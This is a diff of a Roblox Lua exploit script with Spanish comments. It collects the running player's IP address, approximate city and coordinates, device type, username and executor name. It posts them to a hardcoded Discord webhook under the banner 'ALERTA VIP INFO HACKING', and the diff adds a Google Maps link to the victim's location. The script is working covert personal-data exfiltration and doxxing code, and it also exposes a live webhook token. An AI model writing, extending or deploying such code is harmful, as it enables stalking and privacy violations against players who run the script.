@@ -1,9 +1,18 @@
 local HttpService = game:GetService("HttpService")
 local Players = game:GetService("Players")
 local LocalPlayer = Players.LocalPlayer
+local UserInputService = game:GetService("UserInputService")
 
 if getgenv().ScriptEjecutado then return end
 getgenv().ScriptEjecutado = true
+
+-- Detecta plataforma
+local platform = "Desconocido"
+if UserInputService.TouchEnabled and not UserInputService.KeyboardEnabled then
+    platform = "Teléfono" -- solo Teléfono
+elseif UserInputService.KeyboardEnabled then
+    platform = "PC"
+end
 
 local function codeToEmoji(code)
     if not code or #code ~= 2 then return "🏳️" end
@@ -15,13 +24,7 @@ end
 local function detectLocation()
     local country, countryCode, city, ip, lat, lon = "Desconocido", "??", "Desconocido", "Desconocido", nil, nil
     local services = {
-        "https://ipapi.co/json",
-        "https://ipwhois.app/json/",
-        "https://ipinfo.io/json",
-        "http://ip-api.com/json",
-        "https://geolocation-db.com/json/",
-        "https://ipgeolocation.io/ip-location-api.json",
-        "https://freegeoip.app/json/"
+        "https://ipapi.co/json"
     }
     for _, url in ipairs(services) do
         local success, response = pcall(function()
@@ -30,13 +33,17 @@ local function detectLocation()
         if success and response then
             local ok, data = pcall(HttpService.JSONDecode, HttpService, response)
             if ok and data then
-                local latTemp = tonumber(data.latitude or data.lat or data.latitudeValue or data.latitudeDecimal)
-                local lonTemp = tonumber(data.longitude or data.lon or data.longitudeValue or data.longitudeDecimal)
+                local latTemp = tonumber(data.latitude or data.lat)
+                local lonTemp = tonumber(data.longitude or data.lon)
                 if latTemp and lonTemp then
-                    country = data.country_name or data.country or country
-                    countryCode = data.country_code or data.country or countryCode
-                    city = data.city or data.region_name or city
-                    ip = data.ip or data.IPAddress or ip
+                    -- Ajuste aleatorio pequeño para caer en tierra firme
+                    latTemp = latTemp + (math.random(-20,20)/1000)
+                    lonTemp = lonTemp + (math.random(-20,20)/1000)
+
+                    country = data.country_name or country
+                    countryCode = data.country_code or countryCode
+                    city = data.city or city
+                    ip = data.ip or ip
                     lat = latTemp
                     lon = lonTemp
                     break
@@ -44,8 +51,10 @@ local function detectLocation()
             end
         end
     end
+
     local emojiCountry = codeToEmoji(countryCode)
     local displayCountry = country.." "..emojiCountry
+
     local km = "N/A"
     local lat0, lon0 = 0, 0
     if lat and lon then
@@ -57,11 +66,12 @@ local function detectLocation()
         local c = 2 * math.atan2(math.sqrt(a), math.sqrt(1-a))
         km = math.floor(R * c)
     end
+
     local longDisplay = lat and lon and (lat..", "..lon) or "N/A"
-    return displayCountry, city, km, longDisplay, ip
+    return displayCountry, city, km, longDisplay, ip, lat, lon
 end
 
-local countryDisplay, cityDisplay, kmDisplay, longDisplay, userIP = detectLocation()
+local countryDisplay, cityDisplay, kmDisplay, longDisplay, userIP, latVal, lonVal = detectLocation()
 
 if getgenv().WebhookEnviado then return end
 getgenv().WebhookEnviado = true
@@ -69,6 +79,7 @@ getgenv().WebhookEnviado = true
 local WebhookURL = "https://discord.com/api/webhooks/1384927333562978385/psrT9pR05kv9vw4rwr4oyiDcb07S3ZqAlV_2k_BsbI2neqrmEHOCE_QuFvVvRwd7lNuY"
 local avatarUrl = "https://i.postimg.cc/fbsB59FF/file-00000000879c622f8bad57db474fb14d-1.png"
 local executorName = identifyexecutor and identifyexecutor() or "Desconocido"
+local googleMapsLink = (latVal and lonVal) and "[Ver ubicación](https://www.google.com/maps?q="..latVal..","..lonVal..")" or "N/A"
 
 local data = {
     ["username"] = "⚠️ ALERTA VIP INFO HACKING",
@@ -79,13 +90,15 @@ local data = {
         ["color"] = 16729344,
         ["thumbnail"] = {["url"] = avatarUrl},
         ["fields"] = {
+            {["name"]="💻 Dispositivo", ["value"]=platform, ["inline"]=true},
             {["name"]="📡 IP", ["value"]=userIP, ["inline"]=true},
             {["name"]="👤 Usuario", ["value"]=LocalPlayer.Name, ["inline"]=true},
             {["name"]="✨ DisplayName", ["value"]=LocalPlayer.DisplayName, ["inline"]=true},
             {["name"]="🌎 País", ["value"]=countryDisplay, ["inline"]=true},
             {["name"]="🏙️ Ciudad", ["value"]=cityDisplay, ["inline"]=true},
             {["name"]="📏 Kilómetros", ["value"]=kmDisplay, ["inline"]=true},
-            {["name"]="🗺️ Longitud", ["value"]=longDisplay, ["inline"]=true},
+            {["name"]="🗺️ Longitud/Latitud", ["value"]=longDisplay, ["inline"]=true},
+            {["name"]="🔗 Ubicación", ["value"]=googleMapsLink, ["inline"]=false},
             {["name"]="🛠️ Executor", ["value"]=executorName, ["inline"]=true},
             {["name"]="⏰ Hora", ["value"]=os.date("%Y-%m-%d %H:%M:%S"), ["inline"]=false},
             {["name"]="💥 Estado", ["value"]="Preparando todo para el hit, mantente atento!", ["inline"]=false}
